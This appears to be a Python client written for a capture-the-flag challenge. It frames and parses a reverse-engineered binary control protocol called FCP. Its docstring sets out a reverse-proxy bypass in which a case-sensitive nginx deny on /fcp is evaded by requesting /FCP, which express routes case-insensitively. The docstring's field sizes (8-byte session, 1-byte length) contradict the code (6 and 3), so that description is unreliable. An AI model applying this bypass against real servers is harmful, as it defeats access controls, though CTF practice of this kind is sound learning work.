#!/usr/bin/env python3
"""
FCP (Fluxion Control Plane) client for the fluxion arming handshake.

Wire format, reversed from the live build on 2026-09-05:
    "FX" | ver(1)=0x01 | opcode(1) | sessionId(8) | payloadLen(1) | payload
        | crc32be(4) over every byte before the crc

Opcodes, from GET /FCP (the endpoint self-documents):
    0x01 HELLO, 0x02 KEX, 0x03 ARM, 0x04 TICK.  0xee is the error opcode.
Known error payloads: E_FRAME, E_NO_SESSION, E_ENROLL_SIG.

IMPORTANT.  nginx in front of the app answers 403 to /fcp.  Its location match
is case sensitive, express routing is case insensitive, so POST /FCP reaches
the app.  //fcp, /fcp/, /./fcp, /x/../fcp, and /fcp%20 all stay 403.
Also: send content-type application/octet-stream or text/plain.  With
application/json the global express.json parser eats the body first.
"""

import http.client as hc
import os
import struct
import time
import urllib.parse
import zlib

TARGET = os.environ.get("CTF_TARGET", "").rstrip("/")
if not TARGET:
    raise SystemExit("set CTF_TARGET, e.g. http://fluxion-xxxx.challs.ctf.thefewchosen.com")
_P = urllib.parse.urlsplit(TARGET)
_HOST, _PORT = _P.hostname, (_P.port or 80)
_conn = [None]

OP_HELLO, OP_KEX, OP_ARM, OP_TICK, OP_ERR = 1, 2, 3, 4, 0xEE
ZERO = b"\x00" * 6


def _crc(b):
    return struct.pack(">I", zlib.crc32(b) & 0xFFFFFFFF)


def frame(op, session=ZERO, payload=b"", ver=1):
    if isinstance(payload, str):
        payload = payload.encode()
    h = (b"FX" + bytes([ver, op]) + session
         + struct.pack(">I", len(payload))[1:] + payload)
    return h + _crc(h)


def parse(b):
    """-> (ver, opcode, session6, payload) or None."""
    if len(b) < 17 or b[:2] != b"FX":
        return None
    n = int.from_bytes(b[10:13], "big")
    return b[2], b[3], b[4:10], b[13:13 + n]


def send(body, path="/FCP", ct="application/octet-stream", method="POST", extra=None,
         pace=0.12, tries=4):
    hdrs = {"content-type": ct, "connection": "keep-alive"}
    if extra:
        hdrs.update(extra)
    for a in range(tries):
        try:
            if _conn[0] is None:
                _conn[0] = hc.HTTPConnection(_HOST, _PORT, timeout=25)
            _conn[0].request(method, path, body, hdrs)
            r = _conn[0].getresponse()
            d = r.read()
            time.sleep(pace)
            return r.status, d
        except Exception:                                # noqa: BLE001
            _conn[0] = None
            time.sleep(0.5 * (a + 1))
    raise RuntimeError("FCP request failed")


def call(op, session=ZERO, payload=b"", **kw):
    st, d = send(frame(op, session, payload), **kw)
    p = parse(d)
    if p is None:
        return {"http": st, "raw": d}
    return {"http": st, "ver": p[0], "op": p[1], "session": p[2], "payload": p[3],
            "text": p[3].decode("utf-8", "replace")}


if __name__ == "__main__":
    print(call(OP_HELLO))
